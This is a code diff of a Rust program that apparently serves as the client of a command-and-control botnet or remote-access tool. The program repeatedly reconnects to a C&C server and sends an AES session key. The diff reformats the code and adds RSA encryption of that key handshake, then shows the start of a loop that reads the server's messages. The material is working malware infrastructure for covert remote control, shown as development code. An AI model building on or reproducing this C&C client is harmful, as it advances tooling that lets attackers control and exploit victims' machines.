@@ -1,10 +1,10 @@
-use tokio::signal;
-use tokio::io::AsyncWriteExt;
-use std::time::Duration;
 use std::thread;
+use std::time::Duration;
+use tokio::io::AsyncWriteExt;
+use tokio::signal;
 
-mod socket;
 mod crypto;
+mod socket;
 
 const IP: &'static str = "127.0.0.1";
 const PORT: u16 = 8080;
@@ -15,12 +15,15 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let (k, n) = crypto::generate_aes();
 
     let handshake = format!("{} {}", base64::encode(&k.0), base64::encode(&n.0));
+
     loop {
         thread::sleep(Duration::from_millis(1000));
         // connect to the socket
         let connection = socket::connect_to_cnc(IP, PORT).await;
 
-        if let Err(_) = connection {continue} // Break if connection refused.
+        if let Err(_) = connection {
+            continue;
+        } // Break if connection refused.
 
         println!("Connected to C&C server successfully");
 
@@ -28,7 +31,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         // TODO : Use the RSA :facepalm:
         // send handshake
         println!("Sending handshake");
-        stream.stream.write_all(&handshake.as_bytes()).await?;
+        let rsa_encrypted_handshake =
+            crypto::encrypt_with_rsa(handshake.as_bytes().to_vec()).unwrap();
+        stream.stream.write_all(&rsa_encrypted_handshake).await?;
 
         // Message reading loop
         loop {
@@ -36,15 +41,15 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
             if let Err(ref e) = msg {
                 if e.kind() == std::io::ErrorKind::WouldBlock {
-                    continue
+                    continue;
                 }
                 // break
             } // this error probably indicates about block of the read abilities.
 
             let (msg, n_bytes) = msg.unwrap();
-            
+
             if n_bytes == 0 {
-                break // try to reconnect
+                break; // try to reconnect
             }
 
             let trimmed = msg.split(|s| s == &(0 as u8)).next().unwrap();
